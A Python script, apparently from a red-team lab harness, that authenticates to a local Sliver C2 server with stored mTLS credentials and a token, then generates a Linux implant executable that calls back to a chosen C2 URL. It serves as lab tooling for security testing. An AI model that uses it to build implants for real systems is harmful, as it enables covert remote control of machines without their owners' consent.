#!/usr/bin/env python3
"""Enroll a Linux implant against the bridge's own Sliver server — lab harness op.

The IW-09 bridge intentionally exposes no implant-generation endpoint (see
infra/containers/sliver-bridge/README.md): enrolment is a local harness
operation inside the isolated container, which is exactly what this script
is. It reuses the bridge's own connection contract (loopback gRPC, mTLS from
/state/operator.cfg, bearer token) and the pinned protobuf stubs shipped in
the image (/app/gen).

Run it INSIDE the target-lab-sliver-bridge container:

    docker cp scripts/enroll_implant.py target-lab-sliver-bridge:/tmp/
    docker exec target-lab-sliver-bridge python /tmp/enroll_implant.py \
        --url http://sliver-bridge:<listener-port> --name lab-httpd-implant

The binary lands in /state/implants/<name> (the bridge's own implants dir);
`docker cp` it out of the container and place it where the engagement
workspace can stage it.
"""

from __future__ import annotations

import argparse
import json
import os
import sys
from pathlib import Path

sys.path.insert(0, "/app/gen")

import grpc
from clientpb import client_pb2
from commonpb import common_pb2
from rpcpb import services_pb2_grpc

OPERATOR_CFG = Path("/state/operator.cfg")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="implant C2 URL, e.g. http://sliver-bridge:18080")
    parser.add_argument("--name", default="lab-httpd-implant")
    parser.add_argument("--os", default="linux")
    parser.add_argument("--arch", default="amd64")
    parser.add_argument("--out", default="/state/implants")
    args = parser.parse_args()

    config = json.loads(OPERATOR_CFG.read_text())
    for key in ("lport", "token", "ca_certificate", "certificate", "private_key"):
        if not config.get(key):
            print(f"operator config is missing {key}", file=sys.stderr)
            return 1
    credentials = grpc.ssl_channel_credentials(
        root_certificates=config["ca_certificate"].encode(),
        private_key=config["private_key"].encode(),
        certificate_chain=config["certificate"].encode(),
    )
    channel = grpc.secure_channel(
        f"127.0.0.1:{config['lport']}",
        credentials,
        options=[
            ("grpc.ssl_target_name_override", "multiplayer"),
            # Generated implant binaries are ~20 MB; the gRPC default receive
            # cap is 4 MB.
            ("grpc.max_receive_message_length", 64 * 1024 * 1024),
        ],
    )
    rpc = services_pb2_grpc.SliverRPCStub(channel)
    metadata = [("authorization", f"Bearer {config['token']}")]

    request = client_pb2.GenerateReq(
        Name=args.name,
        Config=client_pb2.ImplantConfig(
            GOOS=args.os,
            GOARCH=args.arch,
            C2=[client_pb2.ImplantC2(Priority=0, URL=args.url)],
            Format=client_pb2.EXECUTABLE,
            ObfuscateSymbols=False,
            # Sliver's Generate handler always resolves the HTTP-C2 config by
            # name (LoadHTTPC2ConfigByName errors on an empty name), and the
            # server seeds this default profile at boot.
            HTTPC2ConfigName="default",
        ),
    )
    response = rpc.Generate(request, metadata=metadata, timeout=600)
    os.makedirs(args.out, exist_ok=True)
    output = Path(args.out) / (response.ImplantName or args.name)
    output.write_bytes(response.File.Data)
    print(
        f"implant written: {output} ({len(response.File.Data)} bytes, "
        f"{args.os}/{args.arch}, c2={args.url})"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
